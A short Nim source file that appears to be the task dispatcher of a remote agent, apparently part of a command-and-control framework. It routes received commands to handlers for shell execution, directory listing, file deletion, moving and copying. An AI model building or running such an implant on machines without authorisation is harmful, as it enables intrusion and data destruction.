import strutils, tables, json
import ../agentTypes 
import ../commands/commands
import ../../../common/types
import sugar

proc handleTask*(config: AgentConfig, task: Task): TaskResult = 

    let handlers = {
        CMD_SLEEP: taskSleep,
        CMD_SHELL: taskShell,
        CMD_PWD: taskPwd,
        CMD_CD: taskCd,
        CMD_LS: taskDir,
        CMD_RM: taskRm,
        CMD_RMDIR: taskRmdir,
        CMD_MOVE: taskMove, 
        CMD_COPY: taskCopy
    }.toTable

    # Handle task command
    return handlers[cast[CommandType](task.command)](config, task)